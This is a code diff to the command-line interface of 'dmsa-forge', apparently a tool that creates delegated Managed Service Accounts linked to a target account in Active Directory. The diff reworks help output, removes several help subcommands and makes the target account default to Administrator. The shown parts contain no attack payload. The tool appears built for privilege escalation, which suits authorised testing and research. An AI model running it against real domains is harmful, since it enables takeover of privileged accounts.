     if include_help_advanced:
         local.add_argument('--help-advanced', action='store_true', help='Show advanced options for this command and exit.')
 
 
-def add_connection_options(parser, include_auth=True, show_auth=True):
+def add_connection_options(parser, include_auth=True, show_auth=True, concise=False):
     ldap_group = parser.add_argument_group('LDAP')
-    ldap_group.add_argument('--base-dn', '--baseDN', '-baseDN', dest='base_dn', action='store', metavar='BASE_DN', help='Set LDAP base DN. Defaults from account domain.')
-    ldap_group.add_argument('--scope-base-dn', action='store', metavar='BASE_DN', help='Guardrail: refuse target DNs outside this base DN. Defaults from account/scope domain.')
-    ldap_group.add_argument('--scope-domain', action='store', metavar='FQDN', help='Guardrail: refuse obvious domain/base DN mismatches. Defaults from account domain.')
+    hidden = argparse.SUPPRESS
+    ldap_group.add_argument('--base-dn', '--baseDN', '-baseDN', dest='base_dn', action='store', metavar='BASE_DN', help=hidden if concise else 'Set LDAP base DN. Defaults from account domain.')
+    ldap_group.add_argument('--scope-base-dn', action='store', metavar='BASE_DN', help=hidden if concise else 'Guardrail: refuse target DNs outside this base DN. Defaults from account/scope domain.')
+    ldap_group.add_argument('--scope-domain', action='store', metavar='FQDN', help=hidden if concise else 'Guardrail: refuse obvious domain/base DN mismatches. Defaults from account domain.')
     ldap_group.add_argument('--method', '-method', type=connection_method, default='LDAP', help='Connection method: LDAP or LDAPS. Defaults to LDAP/389.')
     ldap_group.add_argument('--port', '-port', type=int, choices=[389, 636], help='Destination port. LDAP defaults to 389, LDAPS to 636.')
     ldap_group.add_argument('--dc-host', '-dc-host', dest='dc_host', action='store', metavar='HOSTNAME', help='Hostname of the domain controller.')
@@ -4077,7 +4250,7 @@ def add_dmsa_workflow_options(parser, action):
         workflow.add_argument('--dmsa-name', '-dmsa-name', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name.')
         workflow.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN.')
     if action == 'add':
-        workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN.')
+        workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN. Defaults to Administrator.')
     if action in ('add', 'verify'):
         workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='Expected managed-password reader.')
     if action == 'add':
@@ -4106,14 +4279,15 @@ def build_subcommand_parser():
         subparser = subparsers.add_parser(
             action,
             help=ACTION_SUMMARY[action],
+            usage=ACTION_USAGE[action],
             description=ACTION_HELP.get(action, ACTION_SUMMARY[action]),
             formatter_class=argparse.RawDescriptionHelpFormatter,
         )
         subparser.set_defaults(action=action, command=action, action_first=True)
         subparser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
         add_dmsa_workflow_options(subparser, action)
-        add_common_local_options(subparser, include_help_advanced=True)
-        add_connection_options(subparser, show_auth=False)
+        add_common_local_options(subparser, include_help_advanced=True, concise=True)
+        add_connection_options(subparser, show_auth=False, concise=True)
         add_common_advanced_options(subparser, visible=False)
 
     plan_parser = subparsers.add_parser(
@@ -4205,6 +4379,9 @@ def prepare_cli_options(parser, options):
         normalized = normalized_dmsa_name(options.dmsa_name)
         if normalized:
             options.dmsa_name = normalized
+
+    if options.action == 'add' and not options.target_account:
+        options.target_account = DEFAULT_SUGGESTED_TARGET_ACCOUNT
 
     account_domain = domain_from_account_hint(options.account)
     if account_domain and validate_domain_name(account_domain):
@@ -5022,7 +5199,7 @@ def print_shell_collision_note():
 
 
 def completion_script(shell):
-    commands = ' '.join(ACTION_CHOICES + ('plan', 'update', 'actions', 'examples', 'help'))
+    commands = ' '.join(ACTION_CHOICES + ('plan', 'update'))
     common_options = '--help -h --version -v --profile --dry-run --plan --json --output --output-only --quiet --no-banner --redact --no-redact --scope-domain --scope-base-dn --dc-host --dc-ip --method --port --include-security-descriptor --include-sd --resolve-names'
     if shell == 'bash':
         return '''# dmsa-forge bash completion
@@ -5108,23 +5285,6 @@ def _main(argv=None):
         if legacy_removed in REMOVED_COMMANDS:
             parser = build_subcommand_parser()
             parser.error(removed_command_message(legacy_removed))
-        if argv[0] == 'actions':
-            if len(argv) != 1:
-                sys.stderr.write('Usage: dmsa-forge actions\n')
-                return 2
-            print_actions()
-            return 0
-        if argv[0] == 'examples':
-            if len(argv) != 1:
-                sys.stderr.write('Usage: dmsa-forge examples\n')
-                return 2
-            print_examples()
-            return 0
-        if argv[0] == 'help':
-            if len(argv) > 2:
-                sys.stderr.write('Usage: dmsa-forge help [action]\n')
-                return 2
-            return print_action_help(argv[1] if len(argv) == 2 else None)
 
     if argv[0] in ACTION_CHOICES and ('--action' in argv[1:] or '-action' in argv[1:]):
         parser = build_subcommand_parser()
